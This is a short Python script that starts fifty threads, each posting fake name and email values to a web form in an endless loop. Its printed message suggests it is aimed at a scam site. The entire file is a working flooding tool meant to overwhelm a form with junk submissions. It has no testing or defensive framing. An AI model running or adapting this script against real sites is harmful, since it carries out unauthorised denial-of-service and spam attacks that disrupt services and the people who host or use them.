import requests
import threading

url = ''

data = {
    'form_fields[name]': 'urmother',
    'form_fields[email]': 'urmother@gmail.com',
}

def do_request():
    while True:
        response = requests.post(url, data=data).text
        print("sending requests to scem")

threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
